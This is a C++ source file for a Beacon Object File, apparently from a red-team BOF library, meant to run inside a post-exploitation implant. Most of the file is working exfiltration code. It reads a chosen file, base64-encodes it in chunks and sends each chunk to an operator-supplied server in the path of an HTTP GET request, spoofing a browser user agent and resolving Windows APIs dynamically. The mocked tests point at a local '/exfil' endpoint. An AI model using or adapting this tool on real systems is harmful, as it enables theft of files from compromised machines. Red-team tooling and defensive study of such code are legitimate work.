#include <Windows.h>
#include <winhttp.h>
#include "..\Core\base\helpers.h"

#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#pragma comment(lib, "Winhttp.lib")
#include "..\Core\base\mock.h"
#endif

#if defined(_GTEST)
#include <gtest\gtest.h>
using m_FileExfiltrationUrlEncoded = bool(*)(const char*, const char*);

m_FileExfiltrationUrlEncoded FileExfiltrationUrlEncoded = nullptr;

class MockedFunctions : public ::testing::Test {
protected:
	void SetUp() override {
		FileExfiltrationUrlEncoded = [](const char*, const char*) -> bool {
			BeaconPrintf(CALLBACK_OUTPUT, "Exfiltrated 1 chunks successfully.");
			return true;
			};
	}
	void TearDown() override {
		FileExfiltrationUrlEncoded = nullptr;
	}
};
#else
#include "..\Core\beacon.h"
#include "..\Core\sleepmask.h"

extern "C" {
	DFR(KERNEL32, CreateFileA);
	DFR(KERNEL32, ReadFile);
	DFR(KERNEL32, GetFileSize);
	DFR(KERNEL32, CloseHandle);
	DFR(KERNEL32, GetLastError);
	DFR(WINHTTP, WinHttpOpen);
	DFR(WINHTTP, WinHttpConnect);
	DFR(WINHTTP, WinHttpOpenRequest);
	DFR(WINHTTP, WinHttpSendRequest);
	DFR(WINHTTP, WinHttpReceiveResponse);
	DFR(WINHTTP, WinHttpCloseHandle);
	DFR(WINHTTP, WinHttpCrackUrl);
}
#define CreateFileA KERNEL32$CreateFileA
#define ReadFile KERNEL32$ReadFile
#define GetFileSize KERNEL32$GetFileSize
#define CloseHandle KERNEL32$CloseHandle
#define GetLastError KERNEL32$GetLastError
#define WinHttpOpen WINHTTP$WinHttpOpen
#define WinHttpConnect WINHTTP$WinHttpConnect
#define WinHttpOpenRequest WINHTTP$WinHttpOpenRequest
#define WinHttpSendRequest WINHTTP$WinHttpSendRequest
#define WinHttpReceiveResponse WINHTTP$WinHttpReceiveResponse
#define WinHttpCloseHandle WINHTTP$WinHttpCloseHandle
#define WinHttpCrackUrl WINHTTP$WinHttpCrackUrl

static int Base64Encode(const unsigned char* input, int inputLen, char* output, int outputSize) {
	static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
	int i = 0, j = 0;
	while (i < inputLen) {
		unsigned int a = i < inputLen ? input[i++] : 0;
		unsigned int b = i < inputLen ? input[i++] : 0;
		unsigned int c = i < inputLen ? input[i++] : 0;
		unsigned int triple = (a << 16) | (b << 8) | c;

		int remaining = inputLen - (i - 3);
		if (j + 4 > outputSize) return -1;

		output[j++] = table[(triple >> 18) & 0x3F];
		output[j++] = table[(triple >> 12) & 0x3F];
		output[j++] = (remaining > 1) ? table[(triple >> 6) & 0x3F] : '\0';
		output[j++] = (remaining > 2) ? table[triple & 0x3F] : '\0';
	}
	// Trim trailing null chars used as padding placeholders
	while (j > 0 && output[j - 1] == '\0') j--;
	output[j] = '\0';
	return j;
}

bool FileExfiltrationUrlEncoded(const char* filePath, const char* serverUrl) {
	// Parse the server URL
	wchar_t wUrl[2048];
	int wUrlLen = 0;
	for (int i = 0; serverUrl[i] && i < 2047; i++) {
		wUrl[i] = (wchar_t)serverUrl[i];
		wUrlLen++;
	}
	wUrl[wUrlLen] = L'\0';

	URL_COMPONENTS urlComp;
	wchar_t hostName[256];
	wchar_t urlPath[2048];

	for (int i = 0; i < (int)sizeof(urlComp); i++) ((unsigned char*)&urlComp)[i] = 0;

	urlComp.dwStructSize = sizeof(urlComp);
	urlComp.lpszHostName = hostName;
	urlComp.dwHostNameLength = 256;
	urlComp.lpszUrlPath = urlPath;
	urlComp.dwUrlPathLength = 2048;

	if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to parse URL: %d", GetLastError());
		return false;
	}

	// Open the file
	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to open file: %s (error %d)", filePath, GetLastError());
		return false;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get file size or file is empty.");
		CloseHandle(hFile);
		return false;
	}

	// Read file into buffer (use VirtualAlloc-style stack buffer for BOF compatibility)
	// For BOFs, we use a fixed max or heap. Here we read in chunks.
	unsigned char readBuf[4096];
	char b64Buf[8192]; // base64 is ~4/3 of input
	DWORD bytesRead = 0;

	// Create HTTP session
	HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
	if (!hSession) {
		BeaconPrintf(CALLBACK_ERROR, "WinHttpOpen failed: %d", GetLastError());
		CloseHandle(hFile);
		return false;
	}

	HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
	if (!hConnect) {
		BeaconPrintf(CALLBACK_ERROR, "WinHttpConnect failed: %d", GetLastError());
		WinHttpCloseHandle(hSession);
		CloseHandle(hFile);
		return false;
	}

	DWORD totalChunks = (fileSize + 2048 - 1) / 2048; // ~2KB raw per chunk -> ~3KB base64 per chunk (well under 4000 URL limit)
	DWORD chunkIndex = 0;
	DWORD totalSent = 0;
	bool success = true;

	BeaconPrintf(CALLBACK_OUTPUT, "Reading %s (%lu bytes, %lu chunks)", filePath, fileSize, totalChunks);

	while (totalSent < fileSize) {
		DWORD toRead = 2048;
		if (totalSent + toRead > fileSize) {
			toRead = fileSize - totalSent;
		}

		if (!ReadFile(hFile, readBuf, toRead, &bytesRead, NULL) || bytesRead == 0) {
			BeaconPrintf(CALLBACK_ERROR, "ReadFile failed at offset %lu: %d", totalSent, GetLastError());
			success = false;
			break;
		}

		int b64Len = Base64Encode(readBuf, (int)bytesRead, b64Buf, sizeof(b64Buf));
		if (b64Len <= 0) {
			BeaconPrintf(CALLBACK_ERROR, "Base64 encoding failed at chunk %lu", chunkIndex);
			success = false;
			break;
		}

		// Build request path: /urlPath/chunkIndex/totalChunks/base64data
		wchar_t requestPath[8192];
		int pos = 0;

		// Copy base URL path
		for (int i = 0; urlPath[i] && pos < 8000; i++) {
			requestPath[pos++] = urlPath[i];
		}
		if (pos > 0 && requestPath[pos - 1] != L'/') {
			requestPath[pos++] = L'/';
		}

		// Append chunk index
		wchar_t numBuf[16];
		int numLen = 0;
		DWORD tmp = chunkIndex;
		if (tmp == 0) { numBuf[numLen++] = L'0'; }
		else {
			wchar_t rev[16]; int ri = 0;
			while (tmp > 0) { rev[ri++] = L'0' + (wchar_t)(tmp % 10); tmp /= 10; }
			while (ri > 0) numBuf[numLen++] = rev[--ri];
		}
		for (int i = 0; i < numLen && pos < 8000; i++) requestPath[pos++] = numBuf[i];
		requestPath[pos++] = L'/';

		// Append total chunks
		numLen = 0;
		tmp = totalChunks;
		if (tmp == 0) { numBuf[numLen++] = L'0'; }
		else {
			wchar_t rev[16]; int ri = 0;
			while (tmp > 0) { rev[ri++] = L'0' + (wchar_t)(tmp % 10); tmp /= 10; }
			while (ri > 0) numBuf[numLen++] = rev[--ri];
		}
		for (int i = 0; i < numLen && pos < 8000; i++) requestPath[pos++] = numBuf[i];
		requestPath[pos++] = L'/';

		// Append base64 data
		for (int i = 0; i < b64Len && pos < 8100; i++) {
			requestPath[pos++] = (wchar_t)b64Buf[i];
		}
		requestPath[pos] = L'\0';

		// Send GET request
		DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
		HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", requestPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
		if (!hRequest) {
			BeaconPrintf(CALLBACK_ERROR, "WinHttpOpenRequest failed at chunk %lu: %d", chunkIndex, GetLastError());
			success = false;
			break;
		}

		if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
			BeaconPrintf(CALLBACK_ERROR, "WinHttpSendRequest failed at chunk %lu: %d", chunkIndex, GetLastError());
			WinHttpCloseHandle(hRequest);
			success = false;
			break;
		}

		WinHttpReceiveResponse(hRequest, NULL);
		WinHttpCloseHandle(hRequest);

		totalSent += bytesRead;
		chunkIndex++;
	}

	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	CloseHandle(hFile);

	if (success) {
		BeaconPrintf(CALLBACK_OUTPUT, "Exfiltrated %lu chunks successfully.", chunkIndex);
	}

	return success;
}
#endif

extern "C" {
	void go(char* args, int len) {
		datap parser;
		BeaconDataParse(&parser, args, len);
		char* filePath = BeaconDataExtract(&parser, NULL);
		char* serverUrl = BeaconDataExtract(&parser, NULL);

		if (!FileExfiltrationUrlEncoded(filePath, serverUrl)) {
			BeaconPrintf(CALLBACK_ERROR, "File exfiltration failed.");
			return;
		}
	}
}

// Define a main function for the debug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
	bof::runMocked<const char*, const char*>(go, "C:\\Github\\Beacon-Object-File-Library\\test.txt", "http://127.0.0.1:8080/exfil");

	return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

namespace UnitTest {
	TEST_F(MockedFunctions, FileExfiltrationUrlEncodedFails) {
		FileExfiltrationUrlEncoded = [](const char*, const char*) -> bool { return false; };

		std::vector<bof::output::OutputEntry> got = bof::runMocked<const char*, const char*>(go, "C:\\test.txt", "http://127.0.0.1:8080/exfil");

		ASSERT_GT(got.size(), 0) << "Expected at least one output entry";
	}

	TEST_F(MockedFunctions, FileExfiltrationUrlEncodedSuccess) {
		std::vector<bof::output::OutputEntry> got = bof::runMocked<const char*, const char*>(go, "C:\\test.txt", "http://127.0.0.1:8080/exfil");
		ASSERT_GT(got.size(), 0) << "Expected at least one output entry";

		bof::output::OutputEntry expected = { CALLBACK_OUTPUT, "Exfiltrated 1 chunks successfully." };
		ASSERT_EQ(expected, got[0]);
	}
}

#endif
